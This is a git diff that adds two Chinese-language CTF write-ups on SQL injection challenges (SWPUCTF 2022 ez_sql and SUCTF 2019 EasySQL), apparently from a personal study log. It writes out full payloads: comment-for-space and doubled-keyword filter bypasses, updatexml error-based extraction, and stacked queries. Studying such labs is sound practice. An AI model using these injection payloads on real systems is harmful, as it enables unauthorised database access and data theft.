@@ -348,9 +348,67 @@ echo $flag;```
 
 ---
 
-5.
+# #5.[SWPUCTF 2022 新生赛]ez_sql
 
+![/alt text](/images/image-20260107213020508.png)
 
+行吧，没办法了，nssctf就是这样的，做完，就不能在做了。
+
+这是一题POST类的sql，要求传nss为参数。
+
+经过测试发现，正好当nss=1‘时，满足闭合条件。
+
+测试列数：
+
+`nss=1' ORDER BY ? --+`
+
+发现空格不被识别，导致错误，直接用/**/代替。
+
+`nss=1'/**/ORDER/**/BY/**/?/**/#`
+
+但是即便这样，页面显示语句出现der，而没有or，说明or吃过滤了。
+
+`nss=1'/**/OORRDER/**/BY/**/?/**/#`
+
+这样后就成功过去，发现列数为3.
+
+直接尝试：
+
+`id=-1'/**/UNION/**/SELECT/**/1,database(),3#`
+
+找不到问题点。
+
+尝试报错注入：
+
+发现and没出现，尝试绕过。
+
+`nss=-1'/**/AANDND/**/updatexml(1,concat(0x7e,database(),0x7e),1)#`
+
+得到回显：
+
+`NSS_tb`
+
+进行爆表：
+
+`nss=-1'/**/AANDND/**/updatexml(1,concat(0x7e,(sElEcT/**/table_name/**/fRoM/**/infoORrmation_schema.tables/**/wHeRe/**/table_schema='NSS_db'/**/limit/**/0,1),0x7e),1)#`
+
+得到：
+
+`NSS_tb users`
+
+注入：
+
+`nss=-1'/**/AANDND/**/updatexml(1,concat(0x7e,(sElEcT/**/Secr3t/**/fRoM/**/NSS_tb/**/limit/**/0,1),0x7e),1)#`
+
+得到：flll444g Secr3t 还有一个啥，我忘了,也打不开网页了。
+
+最后flag由于报错注入的限制，需要两段注入：
+
+`nss=-1'/**/AANDND/**/updatexml(1,concat(0x7e,(sElEcT/**/mid(Secr3t,61,30)/**/fRoM/**/NSS_tb/**/limit/**/0,1),0x7e),1)#`
+
+组合后得到flag：
+
+**NSSCTF{cda53f56-6210-48d9-9dde-cd2d2b0d77dc}**
 
 
 
@@ -358,7 +416,61 @@ echo $flag;```
 
 
 
+# #6.[suctf 2019]EasySQL
 
+![image-20260108182717340](/images/image-20260108182717340.png)
+
+经过简单的测试发现：
+
+```
+空格，union，updatexml，extractvalue，and，or，“,&，for，from，like
+```
+
+这些全部被过滤，尝试^异或，正好成功了。
+
+探测出当前数据库名字为3个字符，但是观察黑名单，字符注入和报错注入的关键函数都吃过滤，要么就绕过，要么就换种方法。
+
+所以，直接试一下堆叠注入，发现：
+
+`1;show databases#`
+
+正好可以,那就：
+
+`1;show/**/tables;`
+
+得到： `Array ( [0] => 1 ) Array ( [0] => Flag )`
+
+读取过程中发现，Flag也吃过滤。
+
+尝试绕过：
+
+`fLaG，flag，flaG，FLAG` 均不行，疑似所有变体都吃拦截。 * 没有吃过滤，尝试 * 匹配。
+
+但均失败。
+
+多次进行读取测试，发现均失败，似乎后端代码不是正常我认识的sql语句。
+
+看了一下wp。
+
+？？？？？
+
+```
+select $_POST[‘query’] || flag from Flag
+```
+
+这啥，已经包含一个逻辑与了，那直接 `*,1` 就直接出来了。
+
+![image-20260108184314625](/images/image-20260108184314625.png)
+
+**NSSCTF{52f80380-dc4c-494d-9b01-5ddfe49a61d8}**
+
+
+
+---
+
+
+
+# #7
 
 ---
 
